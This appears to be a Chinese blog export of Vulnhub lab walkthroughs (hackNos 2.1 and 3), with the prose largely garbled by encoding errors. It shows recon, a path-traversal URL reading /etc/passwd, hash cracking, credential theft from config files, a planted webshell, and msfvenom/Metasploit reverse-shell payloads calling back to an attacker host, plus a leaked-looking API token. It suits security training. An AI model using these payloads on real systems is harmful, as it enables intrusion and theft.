<blockquote>
<ul>
<li><strong><a href="https://drive.google.com/open?id=1Uszfqoomm7iv_c4aiuNb6UPl8Zgfv58s">Download</a></strong></li>
<li><strong><a href="https://download.vulnhub.com/hacknos/Os-hackNos-2.1.ova">Download (Mirror)</a></strong> </li>
<li><strong>Download <a href="https://download.vulnhub.com/hacknos/Os-hackNos-2.1.ova.torrent">(Torrent)</a></strong>  <strong>(<a href="magnet:?xt=urn:btih:B909DCF0619DB181AAA4F5C00967B3217AE6DBAD&dn=Os-hackNos-2.1.ova&tr=http%3A%2F%2Ftracker.vulnhub.com%3A6969/announce&tr=udp%3A%2F%2Ftracker.vulnhub.com%3A6969/announce&tr=udp%3A%2F%2Ftracker.openbittorrent.com%3A80/announce&tr=udp%3A%2F%2Ftracker.publicbt.com%3A80/announce&tr=udp%3A%2F%2Ftracker.istole.it%3A6969">Magnet</a>)</strong></li>
</ul>
</blockquote>
<h2 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h2><p>é¶æœºè®¾ç½®çš„Host-Onlyç½‘ç»œæ¨¡å¼ï¼Œé€šè¿‡æœ¬æœºç½‘å¡ä¿¡æ¯ç¡®å®šè™šæ‹Ÿæœºç½‘æ–­ï¼Œç„¶åä½¿ç”¨Nmapæ‰«æï¼Œæ¥ç¡®å®šé¶æœºIPã€‚</p>
<pre><code>âœ sudo nmap -sS -O 192.168.56.0/24
Nmap scan report for 192.168.56.104
Host is up (0.0072s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:BB:35:44 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop</code></pre>
<p>ç¡®å®šä¸»æœºIPåï¼Œç„¶åæ‰«æç«¯å£ä¸æœåŠ¡ã€‚</p>
<pre><code>âœ sudo nmap -sS -O 192.168.56.0/24
Nmap scan report for 192.168.56.104
Host is up (0.0072s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:BB:35:44 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop</code></pre>
<p>åªå¼€æ”¾äº†80å’Œ22ï¼Œé‚£ä¹ˆåˆ‡å…¥ç‚¹åº”è¯¥åœ¨webæœåŠ¡ä¸Šã€‚è®¿é—®ç½‘ç«™ï¼Œindexé¡µé¢æ˜¯apacheé…ç½®å¥½çš„é»˜è®¤é¡µé¢ã€‚</p>
<p>ç”¨dirsearchæ‰«æä¸€ä¸‹ç›®å½•ï¼Œå‘ç°å­˜åœ¨<code>/tsweb</code>ç›®å½•ï¼Œè®¿é—®å‘ç°æ˜¯ä¸ªWordpressç«™ç‚¹ã€‚</p>
<p>é¦–é¡µæŸ¥çœ‹æºä»£ç ï¼Œå‘ç°ç‰ˆæœ¬å·ï¼š<code>WordPress 5.3</code>ï¼Œç‰ˆæœ¬è¾ƒæ–°ï¼Œæ²¡ä»€ä¹ˆå¯åˆ©ç”¨çš„æ¼æ´ã€‚</p>
<p>Wordpresså½“ç„¶è¦ä¸Šwpscanå•¦ï¼Œæœç„¶å‘ç°äº†é—®é¢˜ã€‚</p>
<pre><code>âœ wpscan --url http://192.168.56.104/tsweb/ --enumerate u

[i] Plugin(s) Identified:

[+] gracemedia-media-player
 | Location: http://192.168.56.104/tsweb/wp-content/plugins/gracemedia-media-player/
 | Latest Version: 1.0 (up to date)
 | Last Updated: 2013-07-21T15:09:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | [!] 1 vulnerability identified:
 |
 | [!] Title: GraceMedia Media Player 1.0 - Local File Inclusion (LFI)
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9234
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-9618
 |      - https://www.exploit-db.com/exploits/46537/
 |      - https://seclists.org/fulldisclosure/2019/Mar/26
 |
 | Version: 1.0 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://192.168.56.104/tsweb/wp-content/plugins/gracemedia-media-player/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://192.168.56.104/tsweb/wp-content/plugins/gracemedia-media-player/readme.txt

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 &lt;====================&gt; (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] user
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://192.168.56.104/tsweb/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)
</code></pre>
<p>å‘ç°äº†å­˜åœ¨é—®é¢˜çš„æ’ä»¶å’Œä¸€ä¸ªç”¨æˆ·åã€‚</p>
<blockquote>
<p>è¿™é‡Œåœ¨ä½¿ç”¨wpscanæ—¶é‡åˆ°äº†updateå¤±è´¥çš„é—®é¢˜ï¼Œåœ¨æ–‡ç« æœ€åä¼šæœ‰é—®é¢˜è®°å½•ã€‚</p>
</blockquote>
<h2 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><p>è¯¥æ’ä»¶å­˜åœ¨æ–‡ä»¶è¯»å–æ¼æ´</p>
<p>Exp:</p>
<pre><code class="http"> http://192.168.56.104/tsweb/wp-content/plugins/gracemedia-media-player/templates/files/ajax_controller.php?ajaxAction=getIds&amp;cfg=../../../../../../../../../../etc/passwd</code></pre>
<p>è¯»åˆ°äº†ä¸€äº›æœ‰ç”¨ä¿¡æ¯ï¼š</p>
<pre><code>root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
......
......
rohit:x:1000:1000:hackNos:/home/rohit:/bin/bash
mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false
flag:$1$flag$vqjCxzjtRc7PofLYS2lWf/:1001:1003::/home/flag:/bin/rbash</code></pre>
<p>ç”¨æˆ·ï¼š<code>root,rohit,flag</code>ï¼Œä¸”flagçš„å¯†ç hashä¹Ÿå¾—åˆ°äº†ï¼Œè§£å¯†åä¸º<code>topsecret</code>ï¼Œä»¥flagç”¨æˆ·æˆåŠŸsshç™»é™†ã€‚</p>
<ul>
<li>Tips</li>
</ul>
<blockquote>
<p>/etc/passwd:<br>æ™®é€šç”¨æˆ·æƒé™èƒ½å¤ŸæŸ¥çœ‹ </p>
<p>ä¿å­˜ç”¨æˆ·ä¿¡æ¯ï¼Œæ¯ä¸€è¡Œä»£è¡¨ä¸€ä¸ªç”¨æˆ·ï¼Œæ¯ä¸€è¡Œé€šè¿‡å†’å·ï¼šåˆ†ä¸ºä¸ƒä¸ªéƒ¨åˆ†</p>
<p>ç”¨æˆ·å<br>å¯†ç ï¼Œxè¡¨ç¤ºå¯†ç ä¿å­˜åœ¨/etc/shadow<br>UIDï¼Œ0ä»£è¡¨root<br>GIDï¼Œè¡¨ç¤ºæ‰€åœ¨ç»„<br>æè¿°ä¿¡æ¯ï¼Œä¾æ¬¡ä¸ºFull Nameã€Room Numberã€Work Phoneã€Home Phoneå’ŒOther<br>ç”¨æˆ·ä¸»ç›®å½•<br>é»˜è®¤shellç±»å‹</p>
<p>/etc/shadow:<br>åªæœ‰rootç”¨æˆ·æƒé™èƒ½å¤ŸæŸ¥çœ‹</p>
<p>ä¿å­˜åŠ å¯†åçš„å¯†ç å’Œç”¨æˆ·çš„ç›¸å…³å¯†ç ä¿¡æ¯ï¼Œæ¯ä¸€è¡Œä»£è¡¨ä¸€ä¸ªç”¨æˆ·ï¼Œæ¯ä¸€è¡Œé€šè¿‡å†’å·ï¼šåˆ†ä¸ºä¹ä¸ªéƒ¨åˆ†</p>
<p>åŠ å¯†çš„å¯†ç å…·æœ‰å›ºå®šæ ¼å¼ï¼š</p>
<p>$idâ€‹$salt$encrypted</p>
<p>idè¡¨ç¤ºåŠ å¯†ç®—æ³•ï¼Œ1ä»£è¡¨MD5ï¼Œ5ä»£è¡¨SHA-256ï¼Œ6ä»£è¡¨SHA-512 saltè¡¨ç¤ºå¯†ç å­¦ä¸­çš„Salt,ç³»ç»Ÿéšæœºç”Ÿæˆ encryptedè¡¨ç¤ºå¯†ç çš„hash</p>
</blockquote>
<p>æ ¹æ®ç”¨æˆ·æè¿°ï¼Œåœ¨home/rohit/user.txtå‘ç°ç¬¬ä¸€æšflag</p>
<pre><code> MD5-HASH : bae11ce4f67af91fa58576c1da2aad4b </code></pre>
<h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><h3 id="ä¿¡æ¯æ”¶é›†-1"><a href="#ä¿¡æ¯æ”¶é›†-1" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h3><pre><code>flag@hacknos:/$ id
uid=1001(flag) gid=1003(flag) groups=1003(flag)
flag@hacknos:/$ uname -a
Linux hacknos 4.15.0-70-generic #79-Ubuntu SMP Tue Nov 12 10:36:11 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux</code></pre>
<p>flagç”¨æˆ·æƒé™éå¸¸ä½ï¼Œæ‰€ä»¥éœ€è¦æƒ³åŠæ³•æä¸ªé«˜ç‚¹æƒé™çš„è´¦æˆ·ï¼Œæ¯”å¦‚www-dataï¼Œé‚£å°±æƒ³åŠæ³•å†™ä¸ªwebshellã€‚</p>
<p>æŸ¥çœ‹Wordpressçš„é…ç½®æ–‡ä»¶ï¼šwp-config.phpï¼ŒæŸ¥æ‰¾æ•°æ®åº“ç›¸å…³é…ç½®ã€‚</p>
<pre><code>flag@hacknos:/$ cat /var/www/html/tsweb/wp-config.php|grep DB
define( &#39;DB_NAME&#39;, &#39;wordpress&#39; );
define( &#39;DB_USER&#39;, &#39;wpuser&#39; );
define( &#39;DB_PASSWORD&#39;, &#39;hackNos-2.com&#39; );
define( &#39;DB_HOST&#39;, &#39;localhost&#39; );
define( &#39;DB_CHARSET&#39;, &#39;utf8mb4&#39; );
define( &#39;DB_COLLATE&#39;, &#39;&#39; );</code></pre>
<p>å“¦å¼ï¼Œå‘ç°äº†ç”¨æˆ·åå’Œå¯†ç ï¼ŒæˆåŠŸç™»é™†mysqlã€‚</p>
<p>æŸ¥è¯¢wordpressçš„ç”¨æˆ·åå’Œå¯†ç </p>
<pre><code>mysql&gt; select user_login,user_pass from wp_users;
+------------+------------------------------------+
| user_login | user_pass                          |
+------------+------------------------------------+
| user       | $P$B.O0cLMNmn7EoX.JMHPnNIPuBYw6S2/ |
+------------+------------------------------------+
1 row in set (0.00 sec)</code></pre>
<p>æ²¡åŠæ³•è§£å¯†ï¼Œç›´æ¥ä¿®æ”¹å¯†ç ã€‚</p>
<pre><code>mysql&gt; UPDATE wp_users SET user_pass = MD5(&#39;lanvnal&#39;) WHERE user_login =&#39;user&#39;;
Query OK, 1 row affected (0.05 sec)
Rows matched: 1  Changed: 1  Warnings: 0</code></pre>
<p>ç™»é™†åå°ï¼Œä¿®æ”¹æ¨¡æ¿çš„404.phpä»£ç ä¸ºwebshellã€‚é€šè¿‡èšå‰‘è¿æ¥ã€‚</p>
<p>/tmpæ˜¯å¯å†™ç›®å½•ï¼Œç›´æ¥msfä¸€æŠŠæ¢­ï¼Œè·å¾—meterpreter shellã€‚</p>
<pre><code>msf5 &gt; use exploit/multi/handler
msf5 exploit(multi/handler) &gt; set payload linux/x64/meterpreter/reverse_tcp
payload =&gt; linux/x64/meterpreter/reverse_tcp
msf5 exploit(multi/handler) &gt; set LHOST 192.168.56.1
LHOST =&gt; 192.168.56.1
msf5 exploit(multi/handler) &gt; set LPORT 6666
LPORT =&gt; 6666
msf5 exploit(multi/handler) &gt; exploit</code></pre>
<p>ä¸ŠLinEnumæœé›†ä¿¡æ¯ã€‚</p>
<pre><code>;31m[-] It looks like we have some admin users:m
uid=102(syslog) gid=106(syslog) groups=106(syslog),4(adm)
uid=1000(rohit) gid=1000(rohit) groups=1000(rohit),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
</code></pre>
<p>çœ‹äº†çœ‹æ²¡æœ‰suidææƒå¯åˆ©ç”¨çš„ç¨‹åºï¼Œçœ‹æ¥æƒ³åŠæ³•æå®šrohitç”¨æˆ·å°±å¯ä»¥äº†ã€‚</p>
<p>ç¿»é¶æœºæ–‡ä»¶çœ‹çœ‹æœ‰æ²¡æœ‰å¤‡ä»½ä¹‹ç±»çš„ä¼šè—æœ‰ç”¨æˆ·å¯†ç ï¼Œåœ¨<code>/var/backups/passbkp/</code>ç›®å½•ä¸‹å‘ç°md5-hashæ–‡ä»¶ã€‚</p>
<pre><code>$1$rohit$01Dl0NQKtgfeL08fGrggi0</code></pre>
<p>è§£å¯†ç»“æœä¸ºï¼š<code>!%hack41</code>åˆ‡æ¢ç”¨æˆ·ï¼Œç›´æ¥sudo</p>
<h3 id="ææƒ-1"><a href="#ææƒ-1" class="headerlink" title="ææƒ"></a>ææƒ</h3><pre><code>flag@hacknos:/$ su rohit
Password:
rohit@hacknos:/$ sudo su
[sudo] password for rohit:
root@hacknos:/# ls /root
root.txt
root@hacknos:/# cat /root/root.txt
 _______                         __              __  __     #
/       \                       /  |            /  |/  |    #
$$$$$$$  |  ______    ______   _$$ |_          _$$ |$$ |_   #
$$ |__$$ | /      \  /      \ / $$   |        / $$  $$   |  #
$$    $$&lt; /$$$$$$  |/$$$$$$  |$$$$$$/         $$$$$$$$$$/   #
$$$$$$$  |$$ |  $$ |$$ |  $$ |  $$ | __       / $$  $$   |  #
$$ |  $$ |$$ \__$$ |$$ \__$$ |  $$ |/  |      $$$$$$$$$$/   #
$$ |  $$ |$$    $$/ $$    $$/   $$  $$/         $$ |$$ |    #
$$/   $$/  $$$$$$/   $$$$$$/     $$$$/          $$/ $$/     #
#############################################################

#############################################################
MD5-HASH : bae11ce4f67af91fa58576c1da2aad4b

Blog : www.hackNos.com

Author : Rahul Gehlaut

linkedin : https://www.linkedin.com/in/rahulgehlaut/
#############################################################</code></pre>
<h2 id="é‡åˆ°çš„é—®é¢˜å’Œè§£å†³æ–¹æ³•"><a href="#é‡åˆ°çš„é—®é¢˜å’Œè§£å†³æ–¹æ³•" class="headerlink" title="é‡åˆ°çš„é—®é¢˜å’Œè§£å†³æ–¹æ³•"></a>é‡åˆ°çš„é—®é¢˜å’Œè§£å†³æ–¹æ³•</h2><h3 id="wpscanä¸èƒ½updateçš„é—®é¢˜"><a href="#wpscanä¸èƒ½updateçš„é—®é¢˜" class="headerlink" title="wpscanä¸èƒ½updateçš„é—®é¢˜"></a>wpscanä¸èƒ½updateçš„é—®é¢˜</h3><p>Macä¸‹ä½¿ç”¨HomeBrewå®‰è£…æœ€æ–°çš„wpscanï¼Œåœ¨wpscanæ›´æ–°æ•°æ®åº“æ—¶å‘ç”Ÿé”™è¯¯ã€‚</p>
<pre><code>âœ ./wpscan --update
cli_options:
  api_token: pTBhWI3kRUbP8KV3vD6nCtpDussLs9dwYX7bvCSahwQ
_______________________________________________________________
        __          _______   _____
        \ \        / /  __ \ / ____|
         \ \  /\  / /| |__) | (___   ___  __ _ _ __ Â®
          \ \/  \/ / |  ___/ \___ \ / __|/ _` | &#39;_ \
           \  /\  /  | |     ____) | (__| (_| | | | |
            \/  \/   |_|    |_____/ \___|\__,_|_| |_|

        WordPress Security Scanner by the WPScan Team
cli_options:
                       Version 2.9.4
          Sponsored by Sucuri - https://sucuri.net
      @_WPScan_, @ethicalhack3r, @erwan_lr, @_FireFart_
_______________________________________________________________

[i] Updating the Database ...

[!] Unable to get https://data.wpscan.org/local_vulnerable_files.xml.sha512 (status: 403)</code></pre>
<p>curlç»“æœï¼š</p>
<pre><code>âœ curl https://data.wpscan.org/local_vulnerable_files.xml.sha512
error code: 1020%</code></pre>
<p>å»GitHubé¡¹ç›®çœ‹ä¸€ä¸‹æœ€æ–°ç‰ˆæœ¬å‘ç°ç‰ˆæœ¬ç›¸å·®æœ‰ç‚¹å¤§ã€‚</p>
<p>åº”è¯¥æ˜¯ç‰ˆæœ¬å¤ªè€çš„åŸå› ï¼Œæœ€æ–°ç‰ˆæœ¬å·²ç»æ˜¯3.7.7äº†ï¼Œä½†æ˜¯brewçš„æ²¡æœ‰åŠæ—¶æ›´æ–°ã€‚å»GitHubçš„wpscané¡¹ç›®cloneæœ€æ–°æºç ï¼Œè‡ªè¡Œç¼–è¯‘å°±å¥½ã€‚</p>
<pre><code>âœ git clone https://github.com/wpscanteam/wpscan
âœ cd wpscan
âœ bundle install &amp;&amp; rake install</code></pre>
<h3 id="wpscanä½¿ç”¨ä¸Šçš„é—®é¢˜"><a href="#wpscanä½¿ç”¨ä¸Šçš„é—®é¢˜" class="headerlink" title="wpscanä½¿ç”¨ä¸Šçš„é—®é¢˜"></a>wpscanä½¿ç”¨ä¸Šçš„é—®é¢˜</h3><p>ç°åœ¨ä½¿ç”¨wpscanéœ€è¦ä½¿ç”¨å®˜æ–¹çš„api-tokenï¼Œè¿™ä¸ªå¯ä»¥è‡ªå·±æ³¨å†Œä¸€ä¸ªå…è´¹çš„è´¦å·ï¼Œæ¯æ—¥50ä½¿ç”¨æ¬¡æ•°ã€‚</p>
<p><a href="https://links.jianshu.com/go?to=https://wpvulndb.com/users/choose_plan">æ³¨å†Œåœ°å€</a></p>
<p>ä¸ºäº†æ–¹ä¾¿ä½¿ç”¨ï¼Œå¯ä»¥å°†api-tokenä¿å­˜åœ¨æ–‡ä»¶ä¸­ï¼Œåœ¨<code>~/.wpscan/scan.yml</code>æ–‡ä»¶ä¸­æ·»åŠ å¦‚ä¸‹å†…å®¹ï¼š</p>
<pre><code>cli_options:
  api_token: YOUR_API_TOKEN</code></pre>
]]></content>
      <categories>
        <category>é¶æœº</category>
      </categories>
      <tags>
        <tag>Vulnhub</tag>
        <tag>é¶æœº</tag>
      </tags>
  </entry>
  <entry>
    <title>Vulnhubé¶æœºä¹‹HackNos3</title>
    <url>/2020/02/14/vulnhub-ba-ji-zhi-hacknos3/</url>
    <content><![CDATA[<blockquote>
<p>2æœˆ14æƒ…äººèŠ‚ï¼Œæé¶æœºå’Œä¸‹é›ªå¤©æ›´é…å“¦ï½</p>
</blockquote>
<h2 id="é¶æœºä¿¡æ¯"><a href="#é¶æœºä¿¡æ¯" class="headerlink" title="é¶æœºä¿¡æ¯"></a>é¶æœºä¿¡æ¯</h2><ul>
<li><a href="https://www.vulnhub.com/entry/hacknos-reconforce,416/">hackNos: ReconForce</a></li>
</ul>
<ul>
<li><p><strong>Name</strong>: hackNos: Os-hackNos-3</p>
</li>
<li><p><strong>Date release</strong>: 14 Dec 2019</p>
</li>
<li><p><strong>Author</strong>: <a href="https://www.vulnhub.com/author/rahul-gehlaut,656/">Rahul Gehlaut</a></p>
</li>
<li><p><strong>Difficulty</strong> : Intermediate</p>
</li>
<li><p><strong>Flag</strong> : 2 Flag first user And second root</p>
</li>
<li><p><strong>Learning</strong> : Web Application | Enumeration | Privilege Escalation</p>
</li>
</ul>
<blockquote>
<ul>
<li><strong><a href="https://drive.google.com/open?id=1zWTU6BFXPmS8BDeoVc766FwUJQZ4-_RT">Download</a></strong></li>
<li><strong><a href="https://download.vulnhub.com/hacknos/Os-hackNos-3.ova">Download (Mirror)</a></strong> </li>
<li><strong>Download <a href="https://download.vulnhub.com/hacknos/Os-hackNos-3.ova.torrent">(Torrent)</a></strong>  <strong>(<a href="magnet:?xt=urn:btih:9FF44C9BCEDD17BF31022D072B7A587189E3E13E&dn=Os-hackNos-3.ova&tr=http%3A%2F%2Ftracker.vulnhub.com%3A6969/announce&tr=udp%3A%2F%2Ftracker.vulnhub.com%3A6969/announce&tr=udp%3A%2F%2Ftracker.openbittorrent.com%3A80/announce&tr=udp%3A%2F%2Ftracker.publicbt.com%3A80/announce&tr=udp%3A%2F%2Ftracker.istole.it%3A6969">Magnet</a>)</strong></li>
</ul>
</blockquote>
<h2 id="ä¿¡æ¯æœé›†"><a href="#ä¿¡æ¯æœé›†" class="headerlink" title="ä¿¡æ¯æœé›†"></a>ä¿¡æ¯æœé›†</h2><p>å…ˆæ¢æµ‹ä¸»æœºIPï¼Œå› ä¸ºè™šæ‹Ÿæœºé…ç½®çš„Host-Onlyç½‘ç»œæ¨¡å¼ï¼Œé€šè¿‡æŸ¥çœ‹æœ¬æœºè™šæ‹Ÿç½‘å¡å¯ä»¥ç¡®å®šIPæ®µã€‚</p>
<pre><code class="shell">âœ sudo nmap -sS -O 192.168.56.0/24
ç¡®å®šä¸»æœºIPï¼š192.168.56.105</code></pre>
<p>æ‰«ä¸€ä¸‹ç«¯å£çœ‹çœ‹æœ‰å“ªäº›æœåŠ¡ã€‚</p>
<pre><code class="shell">âœ sudo nmap -sT -A 192.168.56.105
Starting Nmap 7.70 ( https://nmap.org ) at 2020-02-14 19:56 CST
Nmap scan report for 192.168.56.105
Host is up (0.00049s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.0p1 Ubuntu 6build1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 ce:16:a0:18:3f:74:e9:ad:cb:a9:39:90:11:b8:8a:2e (RSA)
|   256 9d:0e:a1:a3:1e:2c:4d:00:e8:87:d2:76:8c:be:71:9a (ECDSA)
|_  256 63:b3:75:98:de:c1:89:d9:92:4e:49:31:29:4b:c0:ad (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: WebSec

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.0p1 Ubuntu 6build1 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-csrf: Couldn&#39;t find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn&#39;t find any DOM based XSS.
| http-enum:
|_  /scripts/: Potentially interesting directory w/ listing on &#39;apache/2.4.41 (ubuntu)&#39;
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-stored-xss: Couldn&#39;t find any stored XSS vulnerabilities.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre>
<p>dirsearchçš„ç»“æœï¼š</p>
<pre><code class="shell">[20:00:32] 200 -  195B  - /index.html
[20:00:35] 301 -  318B  - /scripts  -&gt;  http://192.168.56.105/scripts/
[20:00:35] 200 -    2KB - /scripts/
[20:00:36] 403 -  279B  - /server-status
[20:00:36] 403 -  279B  - /server-status/
[20:00:37] 200 -    0B  - /upload.php</code></pre>
<p>è®¿é—®å‘ç°<code>http://192.168.56.105/scripts/</code>ç›´æ¥åˆ—ç›®å½•ï¼Œæœ‰å¦‚ä¸‹æ–‡ä»¶ï¼š</p>
<pre><code class="shell">api_ticket_create.php  
automail.php  
automail.pl  
rcron.php</code></pre>
<h2 id="æ¼æ´å‘ç°-amp-getshell"><a href="#æ¼æ´å‘ç°-amp-getshell" class="headerlink" title="æ¼æ´å‘ç°&amp;getshell"></a>æ¼æ´å‘ç°&amp;getshell</h2><p>ä¸€ç•ªæœç´¢åå‘ç°æ˜¯osticketæ­å»ºçš„é‚®ä»¶ç³»ç»Ÿï¼Œæ²¡å‘ç°å¯åˆ©ç”¨çš„ç‚¹ã€‚</p>
<p>æ„Ÿè§‰è¿˜æœ‰å…¶ä»–çš„çš„é¡µé¢æ²¡æ‰«å‡ºæ¥ï¼Œä¸ŠDirBusterçˆ†ç ´ã€‚å¾ˆå¿«å‘ç°äº†/websecç›®å½•ï¼Œçœ‹ç›®å½•ç»“æ„æ˜¯ä¸ªåšå®¢ç³»ç»Ÿã€‚</p>
<p><code>http://192.168.56.105/websec/admin</code>åå°ç™»å½•é¡µé¢ã€‚ç™»å½•ä¿¡æ¯ä¸ºé‚®ç®±+å¯†ç ã€‚æŒ‰ç…§HackNosé¶æœºçš„ä¼ ç»Ÿåº”è¯¥æ˜¯å’ŒHackNosç›¸å…³çš„ä¿¡æ¯ï¼Œæƒ³åˆ°indexé¡µé¢åˆšæ‰çœ‹åˆ°äº†æœ‰é‚®ç®±åœ°å€å’Œä¸€äº›æ ‡é¢˜ï¼Œé‚æ‹¿æ¥å°è¯•ç™»å½•ï¼Œè¯•äº†ä¸¤ä¸ªå°±æˆåŠŸç™»å½•ã€‚ï¼ˆæœç„¶æ˜¯HackNosä¸€è´¯é£æ ¼ï¼‰</p>
<pre><code>é‚®ç®±ï¼šcontact@hacknos.com
å¯†ç ï¼šSecurityx</code></pre>
<p> æˆåŠŸè¿›å…¥åå°ï¼Œæ˜¯<code>Gila CMS v1.10.9</code>ï¼Œåˆ©ç”¨æ–‡ä»¶ç®¡ç†åŠŸèƒ½ä¸Šä¼ æ–‡ä»¶å†™å…¥ä¸€å¥è¯shellï¼Œ<code>http://192.168.56.105/websec/admin/fm</code>ï¼Œç„¶åé€šè¿‡é‡å‘½åç§»åŠ¨åˆ°ç½‘ç«™æ ¹ç›®å½•<code>src/blog/../../../one.php</code></p>
<p>èšå‰‘è¿æ¥ï¼Œæ‹¿åˆ°ç¬¬ä¸€ä¸ªflag</p>
<pre><code>/home/blackdevil/user.txt
bae11ce4f67af91fa58576c1da2aad4b</code></pre>
<p>PS:è¿™é‡Œå¯ä»¥æ‹¿cwelæ¥åˆ¶ä½œç”¨æˆ·å¯†ç å­—å…¸è¿›è¡Œçˆ†ç ´</p>
<pre><code class="shell">âœ ./cewl.rb http://192.168.56.105/websec/ &gt; /Users/lanvnal/Files/Vulnhub/HackNos-3/oshacknos3dict.

âœ¦ âœ cat /Users/lanvnal/Files/Vulnhub/HackNos-3/oshacknos3dict.txt
CeWL 5.4.8 (Inclusion) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
hackNos
com
and
Bootstrap
JavaScript
Start
www
Out
More
Securityx
has
everything
you
need
get
your
new
website
running
time
All
the
templates
themes
are
open
source
free
download
easy
use
strings
attached
Get
Started
Your
Service
contact
hacknos
core
Plugin
Custom
scripts
for
this
Navigation
template
About
Services
Portfolio
Contact
Security
Find</code></pre>
<h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><h3 id="ä¿¡æ¯æœé›†-1"><a href="#ä¿¡æ¯æœé›†-1" class="headerlink" title="ä¿¡æ¯æœé›†"></a>ä¿¡æ¯æœé›†</h3><p>å…ˆä¸ŠMSFã€‚</p>
<pre><code class="shell">âœ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.56.1 LPORT=6666  -f elf -o /Users/lanvnal/Files/Vulnhub/HackNos-3/shell.elf

msf5 &gt; use exploit/multi/handler
msf5 exploit(multi/handler) &gt; set payload linux/x64/meterpreter/reverse_tcp
payload =&gt; linux/x64/meterpreter/reverse_tcp
msf5 exploit(multi/handler) &gt; set LHOST 192.168.56.1
LHOST =&gt; 192.168.56.1</code></pre>
<p>åœ¨config.phpå‘ç°æ•°æ®åº“é…ç½®ä¿¡æ¯ï¼Œå»æ•°æ®åº“é‡Œçœ‹ä¸€çœ‹ã€‚</p>
<pre><code class="php">$GLOBALS[&#39;config&#39;] = array (
  &#39;db&#39; =&gt; 
  array (
    &#39;host&#39; =&gt; &#39;localhost&#39;,
    &#39;user&#39; =&gt; &#39;cmsu&#39;,
    &#39;pass&#39; =&gt; &#39;securityx&#39;,
    &#39;name&#39; =&gt; &#39;cms&#39;,
  ),</code></pre>
<pre><code class="shell">MariaDB [cms]&gt; select username,pass from user;
select username,pass from user;
+----------+--------------------------------------------------------------+
| username | pass                                                         |
+----------+--------------------------------------------------------------+
| admin    | $2y$10$E1OkzxLN.G4ZUYGgrGoQFusEFlkgNBeey9v7SI6jDHZQgL7G.YDFO |
+----------+--------------------------------------------------------------+</code></pre>
<p>æ— æ³•è§£å¯†ï¼Œä¹Ÿæ²¡å•¥æœ‰ç”¨çš„ä¿¡æ¯ã€‚</p>
<p>é‚£å°±ä¸ŠLinEnumæœé›†ä¿¡æ¯çœ‹çœ‹å§ã€‚ä»ç»“æœæ¥çœ‹æ²¡æœ‰å¯ä»¥ç”¨æ¥SUIDææƒçš„åº”ç”¨ï¼Œä¹Ÿæ²¡æœ‰å¥‡æ€ªçš„è¿›ç¨‹ã€‚</p>
<p>æœ‰ä»·å€¼çš„ä¿¡æ¯å¦‚ä¸‹ï¼š</p>
<pre><code>[-] It looks like we have some admin users:
uid=104(syslog) gid=110(syslog) groups=110(syslog),4(adm)
uid=1000(blackdevil) gid=118(docker) groups=118(docker),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),115(lxd)

[+] Looks like we&#39;re hosting Docker:
Docker version 19.03.2, build 6a30dfca03</code></pre>
